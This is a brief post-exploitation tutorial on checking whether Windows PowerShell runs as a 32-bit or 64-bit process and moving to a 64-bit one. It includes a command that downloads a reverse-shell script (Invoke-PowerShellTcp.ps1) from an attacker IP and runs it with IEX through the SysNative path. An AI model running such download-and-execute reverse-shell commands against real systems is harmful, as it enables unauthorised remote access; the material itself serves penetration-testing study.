# Windows Migrating Process

## PowerShell Migrating Process

This is a technique to migrate from a 32-bit process to a 64-bit one. It should be said that this procedure is important for the correct enumeration of the system because if it is included in a process that does not run under the architecture of the machine, then post-exploitation tools, will give a bunch of false positives. Knowing with what architecture we are dealing with both the operating system and the process level, we can do it via Powershell, obtaining **True** or **False** depending on whether it is true or not through the following queries.

Operating System Architecture

```
[Environment]::Is64BitOperatingSystem
```

Process Architecture

```
[Environment]::Is64BitProcess
```

If we see that it is a 64-bit operating system, and the statement `[Environment]::Is64BitProcess` returns a **False**, the only thing we will have to do is, for example, winning a session by Powershell and invoke it from the following path:

```
C:\Windows\SysNative\WindowsPowerShell\v1.0\Powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.15:443/Invoke-PowerShellTcp.ps1')
```

In the new reverse shell. If we check again which process we are in, we can see that this time the query`[Environment]::Is64BitProcess` will return a **True**, and we can now continue with the enumeration at the system level.
